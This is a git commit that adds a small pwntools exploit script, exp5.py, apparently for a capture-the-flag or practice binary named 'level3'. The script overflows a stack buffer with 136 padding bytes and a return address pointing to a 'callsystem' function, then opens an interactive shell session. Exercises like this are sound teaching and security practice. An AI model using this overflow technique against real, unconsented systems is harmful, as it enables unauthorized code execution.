4ad6756c21434f621f6da459b1e6fff11907aaab
maoguai <810990206@qq.com>
2018-12-15 16:48:05 +0800

    Create exp5.py

---
+++ shellcode/exp5.py
@@ -0,0 +1,16 @@
+#!python
+#!/usr/bin/env python
+from pwn import *
+
+elf = ELF('level3')
+
+p = process('./level3')
+#p = remote('127.0.0.1',10001)
+
+callsystem = 0x0000555555555159
+
+payload = "A"*136 + p64(callsystem)
+
+p.send(payload)
+
+p.interactive()
